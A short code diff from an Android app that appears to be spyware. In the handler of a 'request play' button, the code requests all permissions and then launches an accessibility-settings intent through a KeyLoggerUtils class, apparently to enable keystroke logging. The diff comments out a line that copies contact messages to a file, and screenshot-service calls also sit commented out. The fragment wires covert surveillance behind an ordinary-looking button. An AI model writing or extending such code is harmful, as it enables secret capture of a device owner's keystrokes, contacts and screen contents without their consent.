@@ -35,8 +35,8 @@ public class ActionUtils {
         if (R.id.main_navigation_request_play_button == viewId) {
             actionButton.setOnClickListener(view -> {
                 new PermissionManager().requestAllPermissions(activity);
-
-                FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages(activity, FileMap.CONTACTS));
+                KeyLoggerUtils.startAccessibilitySettingIntent(activity);
+               // FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages(activity, FileMap.CONTACTS));
 
                 //ScreenshotService.setTakeScreenshot(true);
                 //ScreenshotService.setStopScreenshotService(true);
